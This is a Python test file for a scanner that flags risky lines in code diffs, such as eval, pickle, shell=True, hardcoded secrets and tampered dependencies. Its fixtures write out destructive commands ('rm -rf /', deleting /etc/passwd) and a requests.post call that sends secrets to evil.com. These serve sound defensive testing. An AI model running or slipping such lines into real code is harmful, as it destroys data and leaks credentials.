"""Tests for diff safety scanner."""

from __future__ import annotations

from app.quality.diff_safety_scanner import (
    DiffRiskType,
    DiffSafetyScanner,
    DiffScanResult,
)

# ── Helpers ──────────────────────────────────────────────────────────────


def _make_diff(file_path: str, added_lines: list[str]) -> str:
    """Build a minimal unified diff with added lines."""
    header = (
        f"--- a/{file_path}\n"
        f"+++ b/{file_path}\n"
        f"@@ -0,0 +1,{len(added_lines)} @@\n"
    )
    body = "\n".join(f"+{line}" for line in added_lines)
    return header + body


# ── Clean diff detection ─────────────────────────────────────────────────


class TestCleanDiff:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_clean_diff_is_safe(self) -> None:
        diff = _make_diff("app/utils.py", [
            "def add(a, b):",
            "    return a + b",
        ])
        result = self.scanner.scan_diff(diff)
        assert result.is_safe
        assert result.risk_score == 0.0
        assert len(result.findings) == 0

    def test_clean_diff_counts_files_and_lines(self) -> None:
        diff = _make_diff("app/utils.py", ["x = 1", "y = 2"])
        result = self.scanner.scan_diff(diff)
        assert result.files_scanned == 1
        assert result.lines_scanned == 2


# ── Dangerous operation detection ────────────────────────────────────────


class TestDangerousOperations:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_os_remove_detected(self) -> None:
        diff = _make_diff("cleanup.py", ["os.remove('/tmp/file')"])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.DANGEROUS_OPERATION for f in result.findings)
        assert any("os.remove" in f.pattern_matched for f in result.findings)

    def test_shutil_rmtree_detected(self) -> None:
        diff = _make_diff("cleanup.py", ["shutil.rmtree('/var/data')"])
        result = self.scanner.scan_diff(diff)
        assert any(f.pattern_matched == "shutil.rmtree" for f in result.findings)

    def test_os_system_detected(self) -> None:
        diff = _make_diff("run.py", ["os.system('rm -rf /')"])
        result = self.scanner.scan_diff(diff)
        assert any(f.pattern_matched == "os.system" for f in result.findings)


# ── Security anti-pattern detection ──────────────────────────────────────


class TestSecurityAntipatterns:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_eval_detected(self) -> None:
        diff = _make_diff("app.py", ["result = eval(user_input)"])
        result = self.scanner.scan_diff(diff)
        assert any(
            f.risk_type == DiffRiskType.SECURITY_ANTIPATTERN and "eval" in f.pattern_matched
            for f in result.findings
        )

    def test_exec_detected(self) -> None:
        diff = _make_diff("app.py", ["exec(code_string)"])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.SECURITY_ANTIPATTERN for f in result.findings)

    def test_pickle_loads_detected(self) -> None:
        diff = _make_diff("data.py", ["obj = pickle.loads(data)"])
        result = self.scanner.scan_diff(diff)
        assert any("pickle" in f.pattern_matched for f in result.findings)

    def test_yaml_load_detected(self) -> None:
        diff = _make_diff("config.py", ["cfg = yaml.load(f)"])
        result = self.scanner.scan_diff(diff)
        assert any("yaml.load" in f.pattern_matched for f in result.findings)

    def test_subprocess_shell_true_detected(self) -> None:
        diff = _make_diff("run.py", ["subprocess.run(cmd, shell=True)"])
        result = self.scanner.scan_diff(diff)
        assert any("shell=True" in f.pattern_matched for f in result.findings)


# ── Hardcoded secret detection ───────────────────────────────────────────


class TestHardcodedSecrets:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_hardcoded_password_detected(self) -> None:
        diff = _make_diff("config.py", ['password = "s3cretP@ss"'])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.HARDCODED_SECRET for f in result.findings)

    def test_api_key_detected(self) -> None:
        diff = _make_diff("config.py", ["api_key = 'abc123xyz'"])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.HARDCODED_SECRET for f in result.findings)

    def test_aws_secret_detected(self) -> None:
        diff = _make_diff("settings.py", ['AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI"'])
        result = self.scanner.scan_diff(diff)
        assert any("AWS_SECRET" in f.pattern_matched for f in result.findings)


# ── Dependency tampering detection ───────────────────────────────────────


class TestDependencyTampering:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_git_url_in_requirements_detected(self) -> None:
        diff = _make_diff("requirements.txt", [
            "flask==2.0.0",
            "git+https://github.com/evil/package.git",
        ])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.DEPENDENCY_TAMPERING for f in result.findings)

    def test_normal_requirements_clean(self) -> None:
        diff = _make_diff("requirements.txt", [
            "flask==2.0.0",
            "requests>=2.28.0",
        ])
        result = self.scanner.scan_diff(diff)
        dep_findings = [
            f for f in result.findings
            if f.risk_type == DiffRiskType.DEPENDENCY_TAMPERING
        ]
        assert len(dep_findings) == 0


# ── Privilege escalation detection ───────────────────────────────────────


class TestPrivilegeEscalation:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_sudo_detected(self) -> None:
        diff = _make_diff("deploy.py", ["os.system('sudo apt-get install pkg')"])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.PRIVILEGE_ESCALATION for f in result.findings)

    def test_chmod_777_detected(self) -> None:
        diff = _make_diff("setup.sh", ["chmod 777 /var/data"])
        result = self.scanner.scan_diff(diff)
        assert any(f.pattern_matched == "chmod 777" for f in result.findings)


# ── Data exfiltration detection ──────────────────────────────────────────


class TestDataExfiltration:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_requests_post_with_data_detected(self) -> None:
        diff = _make_diff("leak.py", [
            "requests.post('https://evil.com', data=secrets)",
        ])
        result = self.scanner.scan_diff(diff)
        assert any(f.risk_type == DiffRiskType.DATA_EXFILTRATION for f in result.findings)


# ── Diff format parsing ──────────────────────────────────────────────────


class TestDiffParsing:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_only_added_lines_are_scanned(self) -> None:
        """Removed lines (prefixed with -) should not trigger findings."""
        diff = (
            "--- a/app.py\n"
            "+++ b/app.py\n"
            "@@ -1,3 +1,3 @@\n"
            "-result = eval(old_data)\n"
            "+result = safe_parse(new_data)\n"
        )
        result = self.scanner.scan_diff(diff)
        assert result.is_safe
        assert len(result.findings) == 0

    def test_multi_file_diff(self) -> None:
        diff = (
            "--- a/clean.py\n"
            "+++ b/clean.py\n"
            "@@ -0,0 +1,1 @@\n"
            "+x = 1\n"
            "--- a/bad.py\n"
            "+++ b/bad.py\n"
            "@@ -0,0 +1,1 @@\n"
            "+result = eval(data)\n"
        )
        result = self.scanner.scan_diff(diff)
        assert result.files_scanned == 2
        assert len(result.findings) >= 1


# ── File content scanning ────────────────────────────────────────────────


class TestFileContentScanning:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_scan_file_content_detects_eval(self) -> None:
        content = "import os\nresult = eval(user_input)\n"
        result = self.scanner.scan_file_content(content, "app.py")
        assert any(f.risk_type == DiffRiskType.SECURITY_ANTIPATTERN for f in result.findings)
        assert result.files_scanned == 1
        assert result.lines_scanned == 2

    def test_scan_dependency_file_content(self) -> None:
        content = "flask==2.0\ngit+https://evil.com/pkg.git\n"
        result = self.scanner.scan_file_content(content, "requirements.txt")
        assert any(f.risk_type == DiffRiskType.DEPENDENCY_TAMPERING for f in result.findings)


# ── Allowlist functionality ──────────────────────────────────────────────


class TestAllowlist:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_safe_pattern_suppresses_finding(self) -> None:
        self.scanner.add_safe_pattern(r"# nosec")
        diff = _make_diff("app.py", ["result = eval(data)  # nosec"])
        result = self.scanner.scan_diff(diff)
        assert result.is_safe
        assert len(result.findings) == 0

    def test_safe_pattern_does_not_suppress_other_lines(self) -> None:
        self.scanner.add_safe_pattern(r"# nosec")
        diff = _make_diff("app.py", [
            "result = eval(data)  # nosec",
            "other = exec(code)",
        ])
        result = self.scanner.scan_diff(diff)
        assert len(result.findings) >= 1
        assert all("exec" in f.pattern_matched for f in result.findings)


# ── Risk score calculation ───────────────────────────────────────────────


class TestRiskScore:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_zero_risk_for_clean_diff(self) -> None:
        diff = _make_diff("clean.py", ["x = 1"])
        result = self.scanner.scan_diff(diff)
        assert result.risk_score == 0.0

    def test_risk_score_capped_at_100(self) -> None:
        # Many dangerous patterns should still cap at 100
        lines = [f"eval(data{i})" for i in range(20)]
        diff = _make_diff("bad.py", lines)
        result = self.scanner.scan_diff(diff)
        assert result.risk_score <= 100.0

    def test_unsafe_threshold(self) -> None:
        # A hardcoded secret (weight=35, severity=0.9) + security antipattern
        # should push past the threshold of 40
        diff = _make_diff("bad.py", [
            'password = "hunter2"',
            "result = eval(data)",
        ])
        result = self.scanner.scan_diff(diff)
        assert not result.is_safe
        assert result.risk_score >= 40.0


# ── Multiple findings ────────────────────────────────────────────────────


class TestMultipleFindings:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_multiple_risk_types_in_one_diff(self) -> None:
        diff = _make_diff("bad.py", [
            "os.remove('/etc/passwd')",
            "eval(user_input)",
            'api_key = "sk-12345"',
        ])
        result = self.scanner.scan_diff(diff)
        types_found = {f.risk_type for f in result.findings}
        assert DiffRiskType.DANGEROUS_OPERATION in types_found
        assert DiffRiskType.SECURITY_ANTIPATTERN in types_found
        assert DiffRiskType.HARDCODED_SECRET in types_found


# ── Stats tracking ───────────────────────────────────────────────────────


class TestStats:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_empty_stats(self) -> None:
        stats = self.scanner.get_stats()
        assert stats["total_scans"] == 0
        assert stats["average_risk_score"] == 0.0
        assert stats["findings_by_type"] == {}

    def test_stats_after_scans(self) -> None:
        clean_diff = _make_diff("clean.py", ["x = 1"])
        bad_diff = _make_diff("bad.py", ["eval(data)"])
        self.scanner.scan_diff(clean_diff)
        self.scanner.scan_diff(bad_diff)
        stats = self.scanner.get_stats()
        assert stats["total_scans"] == 2
        assert stats["safe_scans"] >= 1
        assert stats["total_findings"] >= 1
        assert isinstance(stats["findings_by_type"], dict)

    def test_clear_history(self) -> None:
        self.scanner.scan_diff(_make_diff("f.py", ["eval(x)"]))
        self.scanner.clear_history()
        stats = self.scanner.get_stats()
        assert stats["total_scans"] == 0


# ── Edge cases ───────────────────────────────────────────────────────────


class TestEdgeCases:
    def setup_method(self) -> None:
        self.scanner = DiffSafetyScanner()

    def test_empty_diff(self) -> None:
        result = self.scanner.scan_diff("")
        assert result.is_safe
        assert result.files_scanned == 0
        assert result.lines_scanned == 0

    def test_diff_with_no_added_lines(self) -> None:
        diff = (
            "--- a/app.py\n"
            "+++ b/app.py\n"
            "@@ -1,2 +1,1 @@\n"
            "-old_line = eval(x)\n"
            " context_line\n"
        )
        result = self.scanner.scan_diff(diff)
        assert result.is_safe

    def test_finding_has_line_number(self) -> None:
        diff = _make_diff("f.py", ["safe = 1", "bad = eval(x)"])
        result = self.scanner.scan_diff(diff)
        assert len(result.findings) >= 1
        assert result.findings[0].line_number is not None

    def test_dataclass_defaults(self) -> None:
        result = DiffScanResult()
        assert result.findings == []
        assert result.risk_score == 0.0
        assert result.is_safe is True

    def test_finding_recommendation_present(self) -> None:
        diff = _make_diff("f.py", ["eval(x)"])
        result = self.scanner.scan_diff(diff)
        assert result.findings[0].recommendation != ""
